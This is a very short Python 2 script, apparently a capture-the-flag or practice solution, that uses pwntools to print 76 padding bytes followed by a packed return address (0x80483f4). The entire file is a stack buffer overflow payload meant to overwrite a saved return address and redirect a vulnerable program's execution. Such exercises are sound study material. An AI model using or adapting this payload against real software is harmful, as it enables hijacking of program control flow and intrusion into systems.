#!/usr/bin/python
from pwn import *

addr = p32(0x80483f4)
print 'A'*76+addr
